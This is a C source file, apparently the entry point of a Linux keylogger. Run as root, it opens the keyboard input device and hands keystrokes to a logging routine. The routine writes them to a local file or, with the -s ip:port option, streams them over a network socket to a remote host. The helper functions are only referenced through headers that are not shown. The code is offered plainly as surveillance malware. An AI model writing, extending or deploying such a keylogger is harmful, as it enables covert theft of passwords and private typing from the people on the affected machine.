#include "keyboard.h"
#include "keylogger.h"
#include "net.h"
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

void usage() {
  puts("Usage: keylogger -f filename | -s ip:port");
  exit(EXIT_FAILURE);
}

int main(int argc, char **args) {

  int opt, fd, key_fd;
  char *keyboard;
  char *ip;
  int port;

  if (argc < 2) {
    usage();
  }

  if (getuid()) {
    puts("Run as root!");
    exit(EXIT_FAILURE);
  }

  while ((opt = getopt(argc, args, ":f:s:")) != -1) {
    switch (opt) {
    case 'f':
      fd = open(optarg, O_WRONLY | O_CREAT, 0666);
      break;
    case 's':
      ip = strdup(strtok(optarg, ":"));
      port = atoi(strtok(NULL, ":"));
      fd = get_sock(ip, port);
      break;
    default:
      usage();
    }
  }

  keyboard = get_keyboard();
  key_fd = open(keyboard, O_RDONLY);

  keylogger(key_fd, fd);

  close(key_fd);
  close(fd);
}